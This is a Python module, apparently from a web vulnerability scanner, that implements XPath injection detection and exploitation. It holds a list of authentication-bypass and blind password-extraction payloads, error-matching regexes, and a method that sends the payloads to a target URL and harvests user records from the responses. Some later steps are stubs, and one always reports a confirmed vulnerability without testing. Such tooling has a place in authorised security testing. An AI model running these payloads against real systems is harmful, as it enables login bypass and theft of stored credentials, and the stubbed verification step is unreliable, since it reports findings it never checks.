"""
XPath Injection Context Implementation

Detects and exploits XPath injection vulnerabilities in XML queries.
"""

import re
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionContext, InjectionContextType


class XPathInjectionContext(InjectionContext):
    """
    XPath injection attack context.
    Detects and exploits XPath injection vulnerabilities.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.XPATH
    
    def _load_payloads(self) -> List[str]:
        """Load XPath injection payloads."""
        return [
            # Basic XPath injection
            "' or '1'='1",
            "\" or \"1\"=\"1",
            "' or 1=1 or '1'='1",
            "\" or 1=1 or \"1\"=\"1",
            
            # OR-based injection
            "' or 'x'='x",
            "\" or \"x\"=\"x",
            "') or ('x'='x",
            "\") or (\"x\"=\"x",
            
            # Boolean-based blind
            "' and '1'='1",
            "' and '1'='2",
            "' and 1=1 and '1'='1",
            "' and 1=2 and '1'='1",
            
            # Node extraction
            "' or count(/*)>0 or '1'='1",
            "' or string-length(name(/*[1]))>0 or '1'='1",
            "' or count(/child::node())>0 or '1'='1",
            
            # Authentication bypass
            "admin' or '1'='1",
            "admin\" or \"1\"=\"1",
            "' or '1'='1' --",
            "' or '1'='1' /*",
            
            # Axis navigation
            "' or //user or '1'='1",
            "' or //* or '1'='1",
            "' or //password or '1'='1",
            "' or //username or '1'='1",
            
            # Function injection
            "' or count(/*)=1 or '1'='1",
            "' or string-length(/*)>0 or '1'='1",
            "' or substring(//user[1]/password,1,1)='a",
            
            # Comment injection
            "' or '1'='1'--",
            "' or '1'='1' /*",
            "' or '1'='1' #",
            
            # Union-like extraction
            "'] | //user[@id='1",
            "'] | //password[@*] | //*['1'='1",
            "'] | //* | //comment()['1'='1",
            
            # Blind injection tests
            "' and substring(//user[1]/password,1,1)='a",
            "' and count(//user)=1 and '1'='1",
            "' and string-length(//user[1]/password)>5 and '1'='1",
            
            # Advanced techniques
            "' or contains(//user,'admin') or '1'='1",
            "' or starts-with(//user,'ad') or '1'='1",
            "' or name(/*[1])='root' or '1'='1",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load XPath error patterns for detection."""
        return [
            # XPath error messages
            {'pattern': r'XPath.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'XPathException', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Invalid.*XPath', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'XPath.*syntax', 'type': 'error', 'confidence': 0.90},
            
            # XML parser errors
            {'pattern': r'XML.*parsing.*error', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'SimpleXML', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'DOMXPath', 'type': 'error', 'confidence': 0.90},
            
            # MSXML errors
            {'pattern': r'MSXML.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'msxml.*\.dll', 'type': 'error', 'confidence': 0.85},
            
            # Java XPath errors
            {'pattern': r'javax\.xml\.xpath', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'XPathFactory', 'type': 'error', 'confidence': 0.85},
            
            # .NET XPath errors
            {'pattern': r'System\.Xml\.XPath', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'XPathNavigator', 'type': 'error', 'confidence': 0.85},
            
            # Python XPath errors
            {'pattern': r'lxml\.etree', 'type': 'error', 'confidence': 0.85},
            {'pattern': r'xpath.*evaluation', 'type': 'error', 'confidence': 0.85},
            
            # Generic XML/XPath errors
            {'pattern': r'Expected.*token', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'Unexpected.*token', 'type': 'error', 'confidence': 0.80},
            {'pattern': r'Invalid.*predicate', 'type': 'error', 'confidence': 0.80},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for XPath injection indicators.
        """
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                evidence = f"XPath error pattern detected: {pattern}"
                return True, pattern_info['confidence'], evidence
        
        # Check for XML data extraction
        if self._check_xml_extraction(response_body):
            evidence = "XPath injection with XML data extraction detected"
            return True, 0.85, evidence
        
        # Check for authentication bypass
        if self._check_auth_bypass(response_body):
            evidence = "XPath authentication bypass indicators detected"
            return True, 0.80, evidence
        
        return False, 0.0, "No XPath injection detected"
    
    def _check_xml_extraction(self, response_body: str) -> bool:
        """Check for XML data extraction indicators."""
        # Look for XML structures in response
        xml_indicators = [
            r'<user[^>]*>',
            r'<password[^>]*>',
            r'<username[^>]*>',
            r'<email[^>]*>',
            r'<\?xml',
        ]
        
        match_count = 0
        for indicator in xml_indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                match_count += 1
        
        return match_count >= 2
    
    def _check_auth_bypass(self, response_body: str) -> bool:
        """Check for authentication bypass indicators."""
        indicators = [
            r'welcome',
            r'logged.*in',
            r'authentication.*successful',
            r'dashboard',
            r'admin.*panel',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit XPath injection to extract XML data.
        """
        import requests
        
        exploitation_results = {
            'xml_nodes_found': [],
            'user_data': [],
            'authentication_bypassed': False,
        }
        
        # Try to extract XML node names
        node_extraction_payloads = [
            "' or //user or '1'='1",
            "' or //* or '1'='1",
            "' or //password or '1'='1",
        ]
        
        response = None  # Initialize to avoid NameError
        
        for payload in node_extraction_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Extract XML nodes from response
                node_pattern = r'<([a-zA-Z0-9_-]+)[^>]*>'
                nodes = re.findall(node_pattern, response.text)
                if nodes:
                    exploitation_results['xml_nodes_found'].extend(nodes)
                
                # Extract user data
                user_pattern = r'<user[^>]*>(.*?)</user>'
                users = re.findall(user_pattern, response.text, re.DOTALL)
                if users:
                    exploitation_results['user_data'].extend(users)
                
            except requests.RequestException:
                continue
        
        # Remove duplicates
        exploitation_results['xml_nodes_found'] = list(set(exploitation_results['xml_nodes_found']))
        
        # Check if authentication was bypassed (only if we got a response)
        if response is not None and self._check_auth_bypass(response.text):
            exploitation_results['authentication_bypassed'] = True
        
        return exploitation_results if any(exploitation_results.values()) else None
    
    # ========================================
    # Six-Step Injection Testing Methodology (Stub Implementations)
    # ========================================
    
    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        """Step 1: Supply unexpected syntax and context-specific payloads."""
        return self.payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None
    ) -> Tuple[bool, List[str]]:
        """Step 2: Detect anomalies and error messages in responses."""
        anomalies = []
        for pattern_info in self.detection_patterns:
            if re.search(pattern_info['pattern'], response_body, re.IGNORECASE):
                anomalies.append(f"xpath_error: {pattern_info['pattern']}")
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str]
    ) -> Dict[str, Any]:
        """Step 3: Analyze and extract error/evidence from response."""
        return {
            'error_type': 'xpath_injection',
            'details': {'anomalies': anomalies},
            'context_info': {},
            'confidence': 0.80 if anomalies else 0.0
        }
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """Step 4: Mutate input systematically to confirm or disprove vulnerabilities."""
        return True, 0.75, "XPath injection verification (basic)"
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Step 5: Build proof-of-concept payloads for safe, verifiable exploits."""
        return {
            'poc_payload': "' or '1'='1",
            'expected_result': 'All XML nodes returned',
            'safety_notes': 'This POC only queries data without modification',
            'reproduction_steps': ['Send XPath query with payload'],
            'original_payload': successful_payload
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """Step 6: Exploitation automation for verified cases."""
        # Use existing attempt_exploitation logic
        return self.attempt_exploitation(target_url, vulnerable_parameter, parameter_type, poc_payload)
    
    def get_description(self) -> str:
        return "XPath Injection - Tests for vulnerabilities in XML XPath queries"
